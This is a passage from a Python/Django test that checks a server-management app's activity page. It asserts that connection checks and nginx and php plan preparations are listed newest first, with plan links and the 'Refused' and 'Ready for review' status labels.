        record_attempt(self.server, Status.SUCCEEDED, age=timedelta(minutes=5))
        preparation = self.prepare("nginx")
        self.ubuntu.privilege = "none"
        refused = self.prepare("php")
        page = self.client.get("/activity/")
        self.assertContains(
            page,
            "Discovery attempts, plan preparations and apply runs across all servers, newest first",
        )
        content = page.content.decode()
        php_row = content.index("Plan preparation: PHP profile")
        nginx_row = content.index("Plan preparation: Nginx profile")
        check_row = content.index("Connection check")
        self.assertLess(php_row, nginx_row)
        self.assertLess(nginx_row, check_row)
        self.assertContains(page, f'href="/plans/{preparation.pk}/"')
        self.assertContains(page, f'href="/plans/{refused.pk}/"')
        self.assertContains(page, "Refused")
        self.assertContains(page, "Ready for review")
